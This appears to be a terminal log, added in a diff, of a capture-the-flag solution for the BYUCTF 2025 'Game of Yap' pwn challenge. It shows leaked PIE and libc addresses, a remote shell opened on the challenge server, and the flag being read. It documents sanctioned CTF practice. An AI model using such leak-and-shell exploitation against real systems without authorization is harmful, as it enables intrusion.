@@ -1,0 +1,21 @@
+mito@mito-virtual-machine:~/CTF/BYUCTF_2025/Pwn_Game_of_Yap$ python3 solve.py r
+[+] Opening connection to yap.chal.cyberjousting.com on port 1355: Done
+[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+pie_leak = 0x5617320bc210
+pie_base = 0x5617320bb000
+stdout_addr = 0x7fb0d13d95c0
+libc_base   = 0x7fb0d11d5000
+[*] Switching to interactive mode
+$ id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
+$ ls -l
+total 24
+-rw-r--r-- 1 nobody nogroup    50 May  2 21:57 flag.txt
+-rwxr-xr-x 1 nobody nogroup 16416 May  2 21:57 run
+$ cat flag.txt
+byuctf{heres_your_yap_plus_certification_c13abe01}
